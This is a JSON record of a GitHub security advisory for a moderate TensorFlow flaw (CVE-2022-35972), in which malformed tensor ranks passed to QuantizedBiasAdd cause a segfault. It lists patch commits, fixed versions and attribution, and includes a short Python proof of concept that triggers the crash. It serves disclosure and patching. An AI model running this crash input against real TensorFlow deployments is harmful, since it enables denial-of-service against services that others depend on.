{
    "ghsaId": "GHSA-4pc4-m9mj-v2r9",
    "severity": "MODERATE",
    "summary": "TensorFlow vulnerable to segfault in `QuantizedBiasAdd`",
    "description": "### Impact\nIf `QuantizedBiasAdd` is given `min_input`, `max_input`, `min_bias`, `max_bias` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nout_type = tf.qint32\ninput = tf.constant([85,170,255], shape=[3], dtype=tf.quint8)\nbias = tf.constant(43, shape=[2,3], dtype=tf.quint8)\nmin_input = tf.constant([], shape=[0], dtype=tf.float32)\nmax_input = tf.constant(0, shape=[1], dtype=tf.float32)\nmin_bias = tf.constant(0, shape=[1], dtype=tf.float32)\nmax_bias = tf.constant(0, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedBiasAdd(input=input, bias=bias, min_input=min_input, max_input=max_input, min_bias=min_bias, max_bias=max_bias, out_type=out_type)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
    "permalink": "https://github.com/advisories/GHSA-4pc4-m9mj-v2r9",
    "publishedAt": "2022-09-16T22:20:36Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-4pc4-m9mj-v2r9"
        },
        {
            "type": "CVE",
            "value": "CVE-2022-35972"
        }
    ]
}